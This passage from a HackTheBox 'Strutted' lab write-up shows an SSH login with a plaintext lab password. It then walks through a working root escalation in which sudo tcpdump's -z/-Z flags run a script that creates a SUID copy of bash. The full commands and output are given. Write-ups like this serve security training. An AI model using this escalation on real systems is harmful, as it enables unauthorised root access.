<h2 id="user-flag"><span class="me-2">USER FLAG</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>ssh james@strutted.htb
Password: IT14d6SSP81k
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>james@strutted:~<span class="nv">$ </span><span class="nb">ls 
</span>user.txt
james@strutted:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
</pre></td></tr></tbody></table></code></div></div>

<h2 id="privilege-escalation-methodology"><span class="me-2">Privilege Escalation Methodology</span><a href="#privilege-escalation-methodology" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="identifying-the-vector-sudo-permissions-analysis"><span class="me-2">Identifying the Vector: Sudo Permissions Analysis</span><a href="#identifying-the-vector-sudo-permissions-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>After gaining initial access as the user james, the first step in privilege escalation involves auditing sudo permissions. The command sudo -l reveals that james can execute /usr/sbin/tcpdump with root privileges without a password:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>User james may run the following commands on localhost:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump
</pre></td></tr></tbody></table></code></div></div>
<p>This configuration is a critical misstep, as tcpdump (a network traffic analyzer) can be weaponized to execute arbitrary commands when running with elevated privileges.</p>

<h3 id="exploitation-via-tcpdumps--z-flag"><span class="me-2">Exploitation via tcpdump’s -z Flag</span><a href="#exploitation-via-tcpdumps--z-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The tcpdump binary includes a dangerous feature: the -z flag allows executing external scripts after packet capture. Combined with -Z root (which runs commands as root), this becomes a privilege escalation vector. Here’s how it works:</p>

<ul>
  <li>
    <p>Craft a Malicious Payload
  Create a temporary script (TF) that:</p>

    <ul>
      <li>
        <p>Copies /bin/bash to /tmp/rootbash</p>
      </li>
      <li>
        <p>Sets the SUID bit (chmod +s), allowing execution with the file owner’s privileges (root):</p>
      </li>
    </ul>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>james@strutted:~<span class="nv">$ COMMAND</span><span class="o">=</span><span class="s1">'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash'</span>
james@strutted:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
james@strutted:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>
james@strutted:~<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nv">$TF</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="trigger-the-exploit"><span class="me-2">Trigger the Exploit</span><a href="#trigger-the-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Execute tcpdump with flags designed to:</p>

<ul>
  <li>Capture no packets (-i lo for loopback interface)</li>
  <li>Immediately run the malicious script via -z $TF:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>james@strutted:~<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> <span class="nv">$TF</span> <span class="nt">-Z</span> root
tcpdump: listening on lo, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
</pre></td></tr></tbody></table></code></div></div>

<h4 id="flags-breakdown"><span class="me-2">Flags Breakdown:</span><a href="#flags-breakdown" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>W 1: Limit to 1 file</li>
  <li>G 1: Rotate files every 1 second</li>
  <li>Z root: Execute commands as root</li>
</ul>

<h3 id="gaining-root-access"><span class="me-2">Gaining Root Access</span><a href="#gaining-root-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The exploit creates /tmp/rootbash, a SUID-enabled copy of bash. When executed with -p, it preserves the effective UID (root), granting a privileged shell:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>/tmp/rootbash <span class="nt">-p</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Why -p?
The -p flag prevents bash from resetting privileges to the real UID (james). Without it, the SUID bit would be ignored, and the shell would drop back to user-level access.</p>

<h3 id="proof-of-compromise"><span class="me-2">Proof of Compromise</span><a href="#proof-of-compromise" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>With root access, the system is fully compromised. The final step is retrieving the root flag:</p>

<h3 id="4-root-flag"><span class="me-2">4. Root Flag</span><a href="#4-root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>rootbash-5.1# <span class="nb">cat</span> /root/root.txt
</pre></td></tr></tbody></table></code></div></div>

<h2 id="skills-required"><span class="me-2">Skills Required</span><a href="#skills-required" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>Basic source code analysis</li>
  <li>Linux enumeration
    <h2 id="skills-learned"><span class="me-2">Skills Learned</span><a href="#skills-learned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
  </li>
  <li>Exploiting CVEs</li>
  <li>Apache Struts OGNL injection</li>
</ul>

<p>Done!</p>

<hr />
<h1> Hi there 👋 Support me!</h1>
<blockquote class="prompt-tip">
  <p>Life is an echo—what you send out comes back.</p>
</blockquote>
<p><a href="https://www.paypal.com/donate?hosted_button_id=QX3V7C8BAJ84S" target="_blank"
          class="img-link shimmer"
        ><img src="/../../assets/img/DonateButtons/Paypal.png" alt="Donate" width="180" loading="lazy"></a></p>

  </div>
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4238679248235087"
     crossorigin="anonymous"></script>
<!-- Iven's blog ads -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4238679248235087"
     data-ad-slot="1267169343"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/hackthebox/">HackTheBox</a>,
          <a href="/categories/writeup/">Writeup</a>,
          <a href="/categories/medium/">Medium</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeup/"
            class="post-tag no-text-decoration"
          >Writeup</a>
        
          <a
            href="/tags/htb-medium/"
            class="post-tag no-text-decoration"
          >HTB-Medium</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HTB%20Strutted%20Writeup%20(Walkthrough)%20-%20Iven%20Blog&url=https%3A%2F%2Fiven86.github.io%2Fposts%2FStrutted%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Strutted%20Writeup%20(Walkthrough)%20-%20Iven%20Blog&u=https%3A%2F%2Fiven86.github.io%2Fposts%2FStrutted%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fiven86.github.io%2Fposts%2FStrutted%2F&text=HTB%20Strutted%20Writeup%20(Walkthrough)%20-%20Iven%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Heal/">HTB Heal Writeup (Walkthrough)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/UnderPass/">HTB UnderPass Writeup (Walkthrough)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nineveh/">HTB Nineveh Writeup (Walkthrough)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Lame/">HTB Lame Writeup (Walkthrough)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Poison/">HTB Poison Walkthrough - A Deep Dive into FreeBSD Exploitation</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">Writeup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-easy/">HTB-Easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-medium/">HTB-Medium</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/devops/">DevOps</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/troubleshooting/">Troubleshooting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note/">Note</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/github/">GitHub</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Tenet/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1583942400"
  data-df="ll"
  
>
  Mar 11, 2020
</time>

              <h4 class="pt-0 my-2">HTB Tenet Writeup</h4>
              <div class="text-muted">
                <p>INFO Machine IP = 10.10.10.223 OS       = Linux Level    = MEDIUM Points   = 30  Write the IP of the machine to your /etc/hosts file echo &quot;10.10.10.223 tenet.htb&quot; &amp;gt;&amp;gt; /etc/hosts   Scanning nma...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Ophiuchi/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1583942400"
  data-df="ll"
  
>
  Mar 11, 2020
</time>

              <h4 class="pt-0 my-2">HTB Ophiuchi Writeup</h4>
              <div class="text-muted">
                <p>INFO Machine IP = 10.10.10.227 OS       = Linux Level    = MEDIUM Points   = 30  Write the IP of the machine to your /etc/hosts file echo &quot;10.10.10.227 ophiuchi.htb&quot; &amp;gt;&amp;gt; /etc/hosts   SCANNING ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Poison/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1746806400"
  data-df="ll"
  
>
  May  9, 2025
</time>

              <h4 class="pt-0 my-2">HTB Poison Walkthrough - A Deep Dive into FreeBSD Exploitation</h4>
              <div class="text-muted">
                <p>HackTheBox - Poison: Complete Walkthrough  Introduction  Poison represents an excellent medium-difficulty FreeBSD machine on HackTheBox that provides valuable lessons in web vulnerabilities, passwo...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Code_pwned/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HTB Code Writeup (Walkthrough)</p>
    </a>
  

  
    <a
      href="/posts/Cursor-Editor-with-Sandbox/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>How to Properly Install and Run Cursor Editor with Sandbox Enabled on Linux</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/iven86">Iven Blog</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">Writeup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-easy/">HTB-Easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-medium/">HTB-Medium</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/devops/">DevOps</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/troubleshooting/">Troubleshooting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note/">Note</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/github/">GitHub</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

